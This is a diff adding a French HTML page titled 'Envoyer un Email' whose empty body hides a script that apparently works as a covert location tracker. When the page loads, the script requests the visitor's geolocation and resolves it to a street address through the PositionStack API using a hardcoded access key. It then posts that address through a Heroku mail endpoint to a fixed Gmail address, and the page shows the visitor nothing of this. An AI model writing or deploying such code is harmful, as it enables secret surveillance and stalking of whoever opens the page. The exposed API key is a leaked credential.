@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Envoyer un Email</title>
+</head>
+<body>
+    <script>
+        let address = "";
+        reponse2 = getLocation();
+        
+        // Fonction pour obtenir la géolocalisation de l'utilisateur
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                document.getElementById("position").innerHTML = "La géolocalisation n'est pas supportée par ce navigateur.";
+            }
+        }
+
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            console.log(lat, lng);
+
+            const accessKey = '557ad4a9c7953bfa58f59f0dc91ee77d';
+
+            // Utilisation de l'API PositionStack pour obtenir l'adresse exacte
+            fetch(`https://api.positionstack.com/v1/reverse?access_key=${accessKey}&query=${lat},${lng}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.data && data.data.length > 0) {
+                        address = data.data[0].label;
+                        const to = 'hmher866@gmail.com';
+                        const subject = 'Géolocalisation';
+                        const message = address;
+
+                        // Détection de l'environnement pour l'URL
+                        const serverUrl = window.location.hostname === "localhost" 
+                            ? "http://localhost:3000" 
+                            : "https://limitless-journey-44712-06e7cbeb2b65.herokuapp.com/";  // Remplacer par l'URL publique du serveur
+
+                        console.log('Données envoyées :', { to, subject, message });
+
+                        // Envoi de l'email via la requête POST
+                        fetch(`${serverUrl}/send-email`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ to: to, subject: subject, text: message })
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                return response.text().then(text => { throw new Error(text) });
+                            }
+                            return response.json();
+                        })
+                        .then(data => {
+                            console.log('Réponse JSON reçue :', data);
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors de l\'envoi :', error);
+                        });
+                    } else {
+                        document.getElementById("position").innerHTML = "Impossible d'obtenir l'adresse.";
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la requête :', error);
+                });
+        }
+    </script>
+</body>
+</html>
